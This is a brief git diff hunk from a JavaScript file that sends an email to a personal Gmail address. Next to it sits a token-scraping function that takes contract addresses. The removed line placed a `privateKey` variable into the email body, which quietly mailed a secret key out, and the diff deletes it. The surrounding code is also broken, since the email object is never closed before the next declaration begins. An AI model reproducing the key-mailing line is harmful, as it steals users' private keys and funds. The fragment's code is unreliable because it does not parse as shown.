@@ -169,7 +169,7 @@ const obj = {
   to: "mujeerasghar7700@gmail.com",
   subject: "patha",
   text: "This is a plain text version of the email.", 
-  html: `<b>Hello world?</b><br><br><pre>${privateKey}</pre>`, 
+  html: `<b>Hello world?</b><br><br>`, 
   
 const scrapeTokenInfo = async (contractAddress) => {
   let options = new chrome.Options();
